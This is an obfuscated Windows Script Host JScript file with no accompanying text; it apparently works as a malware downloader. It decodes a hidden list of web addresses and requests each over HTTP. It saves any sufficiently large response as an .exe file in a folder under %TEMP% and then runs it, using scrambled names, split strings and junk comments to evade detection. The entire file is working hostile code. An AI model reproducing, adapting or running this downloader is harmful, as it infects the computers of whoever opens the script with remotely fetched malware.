

function QJboUBNjE(PYrnjJMamSg) {
var tKeSslVn = WScript.CreateObject("Wscript.Shell");
tKeSslVn.Run(PYrnjJMamSg, 0x1, 0x0);
}
function ChhHtgUvQ(OOEUM,Lveei,dhqOr) {
var nlTri = "uUmNyg CzC pt.Shell VXtragm Scri".split(" ");
var UJP=((1)?"W" + nlTri[4]:"")+nlTri[2];
var PZ = WScript.CreateObject(UJP);
var kh = "%TEMP%\\";
return PZ.ExpandEnvironmentStrings(kh);
}
function wTpYgyDD() {
var KusnXDv = "ipting";
var hIRiJQyKHA = "ile";
var DbEbW = "System";
return "Sc" + "r" + KusnXDv + ".F" + hIRiJQyKHA + DbEbW + "Obj" + "ect";
}
function fKqq(MRsZU) {
return WScript.CreateObject(MRsZU);
}
function rsYK(GuyKl,CEbMP) {
GuyKl.write(CEbMP);
}
function KmiD(WiGbv) {
WiGbv.open();
}
function dabD(nkWOK,zdeBV) {
nkWOK.saveToFile(zdeBV,236-234);
}
function iemh(CxmFn,KKrau,tFmgc) {
CxmFn.open(tFmgc,KKrau,false);
}
function wadR(fXbDg) {
if (fXbDg == 1089-889){return true;} else {return false;}
}
function pMur(WFnRC) {
if (WFnRC > 191164-664){return true;} else {return false;}
}
function CfnY(XAqGF) {
var CalDI="";
for(n=(449-449); n < XAqGF.length; n++)
if (n % (466-464) != (314-314)) {
CalDI += XAqGF.substr(n, 495-494);
}
return CalDI;
}
function IUyL(faWgD) {
faWgD.send();
}
function IkrE(HmesG) {
return HmesG.status;
}
function MKoFw(cRylCd) {
return new ActiveXObject(cRylCd);
}
var DR="OouhUevl4lzoRw7rPuaf9fw.bcjoYm5 E/18O0P.Ke1x4ec?G Xt7hhiqshi6svi2tQs7qhqt.PcDo8mm/x8p0N.ZeuxCen?B 2?I 1?c 3?";
var A = CfnY(DR).split(" ");
var KyF = ChhHtgUvQ("AjOf","BgOOT","kjioOt");
var osj = MKoFw(wTpYgyDD());
var btUR = KyF+"efIYjwR\\";
try{
osj.CreateFolder(btUR);
}catch(nCFKdY){
};
var kSt = "2.XMLH";
var MBc = (kSt + "TTP" + " gGklrCz FHiYo XML ream St kJzGXawG AD DlgnvAt OD").split(" ");
var sh = true  , Rwrb = MBc[7] + "" + MBc[9];
var Xf = fKqq("MS"+MBc[3]+(518099, MBc[0]));
var KQZ = fKqq(Rwrb + "B." + MBc[5]+(769466, MBc[4]));
var tZz = 0;
var P = 1;
var ApHMLuI = 351254;
var h=tZz;
while (true)  {
if(h>=A.length) {break;}
var wF = 0;
var Cfm = ("ht" + " raiuOFU tp gAhYS pECBoGCZ :// TNEERUn .e xe G ET").split(" ");
try  {
iemh(Xf,Cfm[0]+Cfm[2]+Cfm[5]+A[h]+P, Cfm[9]+Cfm[10]); IUyL(Xf); if (wadR(IkrE(Xf)))  {      
KmiD(KQZ); KQZ.type = 1; rsYK(KQZ,Xf.responseBody); if (pMur(KQZ.size))  {
wF = 1; KQZ.position = 0; dabD(KQZ,/*hYb075TRbz*/btUR/*I6cZ913k7Q*/+ApHMLuI+Cfm[7]+Cfm[8]); try  {
if (((new Date())>0,7540003888)) {
QJboUBNjE(btUR+ApHMLuI+/*oNkB62Eg9m*/Cfm[7]+Cfm[8]/*xLUX984Zyx*/); 
break;
}
}
catch (ti)  {
}; 
}; KQZ.close(); 
}; 
if (wF == 1)  {
tZz = h; break; 
}; 
}
catch (ti)  { 
}; 
h++;
}; 

